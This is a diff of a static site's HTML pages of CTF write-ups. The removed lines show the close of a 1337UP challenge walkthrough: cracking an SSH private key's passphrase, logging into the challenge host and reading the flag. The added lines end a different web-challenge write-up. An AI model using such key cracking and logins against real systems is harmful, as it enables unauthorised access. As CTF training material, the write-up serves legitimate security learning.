-best_h3ckerman!69- (id_rsa)     
-1g 0:00:00:00 DONE (2022-03-12 13:40) 2.325g/s 2.325p/s 2.325c/s 2.325C/s best_h3ckerman!69-
-Use the &quot;--show&quot; option to display all of the cracked passwords reliably
-Session completed. </code></pre>
-</doc-codeblock></div>
-<p>It is confirmed that the password for <code v-pre>id_rsa</code> is <code v-pre>best_h3ckerman!69-</code>
-Lets use SSH to gain access</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">┌──(root💀kali)-[~/.ssh]
-└─# ssh blackn0te@blacknote.ctf.intigriti.io
-Enter passphrase for key '/root/.ssh/id_rsa': 
-Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.144+ x86_64)
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-This system has been minimized by removing packages and content that are
-not required on a system that users do not log into.
-To restore this content, you can run the 'unminimize' command.
-Last login: Sat Mar 12 18:28:34 2022 from 10.10.0.16
-$ id
-uid=1000(blackn0te) gid=1000(blackn0te) groups=1000(blackn0te)
-$ hostname
-misc-liikt1337-db9d484b9-6b7bf
-$ ls
-flag2.txt  notes.txt  write_anything
-$ cat flag2.txt
-ff82f00c4e57d0bb} --&gt; END
-$ </code></pre>
-</doc-codeblock></div>
-<p>So the final flag is <code v-pre>1337UP{5530491e6c0b5159ff82f00c4e57d0bb}</code></p>
+<p>submit the created content url to the bot server.!!</p>
+<p>Here is the flag :
+<code v-pre>flag{filter_fail}</code></p>
 
                                 <div class="flex items-center mt-6 mb-6 clear-both">
                                     <span>
                                         <a href="../../../tags/">
                                             <svg class="inline-block -mb-px mr-1.5 text-blue-500 dark:text-blue-400" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" overflow="visible" fill="currentColor"><g><path d="M21.3 9.88l-8.59-8.59C12.52 1.11 12.27 1 12 1H2c-.55 0-1 .45-1 1v10c0 .27.11.52.29.71l8.59 8.58c.57.57 1.32.88 2.12.88s1.55-.31 2.12-.88l7.17-7.17a3.009 3.009 0 00.01-4.24zm-1.42 2.82l-7.17 7.17c-.39.39-1.02.39-1.42 0L3 11.59V3h8.59l8.29 8.29c.39.39.39 1.03 0 1.41z" /><path d="M7.01 6C6.45 6 6 6.45 6 7s.45 1 1 1 1-.45 1-1-.44-1-.99-1z" /></g></svg>
                                         </a>
-                                        <span class="mr-2"><a href="../../../tags/misc/" class="no-link inline-flex items-center justify-center font-medium leading-none whitespace-nowrap text-blue-500 dark:text-blue-400 border border-blue-500 dark:border-blue-400 hover:bg-blue-100 dark:hover:bg-transparent dark:hover:border-blue-200 dark:hover:text-blue-200 transition-colors duration-200 ease-out h-6 px-2 text-xs rounded-md">
-                                    <span>misc</span>
+                                        <span class="mr-2"><a href="../../../tags/web/" class="no-link inline-flex items-center justify-center font-medium leading-none whitespace-nowrap text-blue-500 dark:text-blue-400 border border-blue-500 dark:border-blue-400 hover:bg-blue-100 dark:hover:bg-transparent dark:hover:border-blue-200 dark:hover:text-blue-200 transition-colors duration-200 ease-out h-6 px-2 text-xs rounded-md">
+                                    <span>web</span>
                                 </a></span>
                                     </span>
                                 </div>
@@ -519,20 +533,20 @@ $ </code></pre>
                             
                                 <nav class="flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../ctftime-writeups/1337up---intigrity/admin/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../ctftime-writeups/foobar-22/crypto/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
                                                 <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
-                                                <span class="block mt-1">Getting admin access</span>
+                                                <span class="block mt-1">Foobar​CTF 2022 Crypto writeup</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../ctftime-writeups/1337up---intigrity/mirage/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../ctftime-writeups/inctf-21/finals-forensics-writeup/">
                                             <span>
                                                 <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
-                                                <span class="block mt-1">Mirage</span>
+                                                <span class="block mt-1">Inctf 21 Pro Finals Forensics Writeup</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                         </a>
@@ -576,6 +590,6 @@ $ </code></pre>
 
     <div id="docs-overlay-target"></div>
 
-    <script>window.__DOCS__ = { "title": "Liikt#1337", level: 3, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
+    <script>window.__DOCS__ = { "title": "HSCTF 2023 Web writeup", level: 3, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
 </body>
 </html>
